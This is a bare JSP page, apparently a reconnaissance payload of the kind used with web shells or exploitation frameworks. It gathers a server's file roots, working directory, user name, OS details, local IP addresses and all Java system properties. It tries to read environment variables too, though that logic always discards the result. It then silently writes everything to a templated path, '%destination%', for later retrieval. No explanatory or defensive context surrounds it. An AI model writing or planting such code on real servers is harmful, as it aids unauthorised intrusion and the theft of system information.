<%@ page import="java.io.File" %>
<%@ page import="java.net.NetworkInterface" %>
<%@ page import="java.net.InetAddress" %>
<%@ page import="java.io.FileOutputStream" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.nio.charset.StandardCharsets" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="java.util.Enumeration" %>
<%@ page import="java.util.Arrays" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.util.Iterator" %>
<%

    File[] files = File.listRoots();
    String buffer = new String();
    for (int i = 0; i < files.length; i++) {
        buffer = String.valueOf(buffer) + files[i].getPath();
        buffer = String.valueOf(buffer) + ";";
    }
    String listFileRoot = buffer;





    ArrayList ipList = new ArrayList();

    try {
        Enumeration networkInterfaces = NetworkInterface.getNetworkInterfaces();

        while(networkInterfaces.hasMoreElements()) {
            NetworkInterface networkInterface = (NetworkInterface)networkInterfaces.nextElement();
            Enumeration inetAddresses = networkInterface.getInetAddresses();

            while(inetAddresses.hasMoreElements()) {
                InetAddress inetAddress = (InetAddress)inetAddresses.nextElement();
                if (inetAddress != null) {
                    String ip = inetAddress.getHostAddress();
                    ipList.add(ip);
                }
            }
        }
    } catch (Exception var6) {
    }

    String getLocalIPList = Arrays.toString(ipList.toArray());






    Map getEnv = null;

    try {
        int jreVersion = Integer.parseInt(System.getProperty("java.version").substring(2, 3));
        if (jreVersion >= 5) {
            try {
                Class var10000 = Class.forName("java.lang.System");

                Method method = var10000.getMethod("getenv");
                if (method != null) {
                    var10000 = method.getReturnType();
                    Class var10001 = Class.forName("java.util.Map");

                    if (var10000.isAssignableFrom(var10001)) {
                        getEnv = (Map)method.invoke((Object)null, (Object[])null);
                    }
                }

                getEnv = null;
            } catch (Exception var5) {
                getEnv = null;
            }
        } else {
            getEnv = null;
        }
    } catch (Exception var6) {
        getEnv = null;
    }





    Enumeration keys = System.getProperties().keys();
    String basicsInfo = new String();
    basicsInfo = String.valueOf(basicsInfo) + "FileRoot : " + listFileRoot + "\n";
    basicsInfo = String.valueOf(basicsInfo) + "CurrentDir : " + (new File("")).getAbsoluteFile() + "/" + "\n";
    basicsInfo = String.valueOf(basicsInfo) + "CurrentUser : " + System.getProperty("user.name") + "\n";
    basicsInfo = String.valueOf(basicsInfo) + "ProcessArch : " + System.getProperty("sun.arch.data.model") + "\n";

    String tmpdir = System.getProperty("java.io.tmpdir");
    char lastChar = tmpdir.charAt(tmpdir.length() - 1);
    if (lastChar != '\\' && lastChar != '/')
        tmpdir = String.valueOf(tmpdir) + File.separator;
    basicsInfo = String.valueOf(basicsInfo) + "TempDirectory : " + tmpdir + "\n";
    basicsInfo = basicsInfo + "OsInfo : " + String.format("os.name: %s os.version: %s os.arch: %s", System.getProperty("os.name"), System.getProperty("os.version"), System.getProperty("os.arch")) + "\n";
    basicsInfo = basicsInfo + "IPList : " + getLocalIPList + "\n";
    while(keys.hasMoreElements()) {
        Object object = keys.nextElement();
        if (object instanceof String) {
            String key = (String)object;
            basicsInfo = basicsInfo + key + " : " + System.getProperty(key) + "\n";
        }
    }
    Map envMap = getEnv;
    String key;
    if (envMap != null) {
        for(Iterator iterator = envMap.keySet().iterator(); iterator.hasNext(); basicsInfo = basicsInfo + key + " : " + envMap.get(key) + "\n") {
            key = (String)iterator.next();
        }
    }

    String path = "%destination%";
    byte[] content = basicsInfo.getBytes(StandardCharsets.UTF_8);
    try{
        File file = new File(path);
        FileOutputStream f = new FileOutputStream(file);
        f.write(content);
        f.close();
    }catch (Exception e){

    }

%>
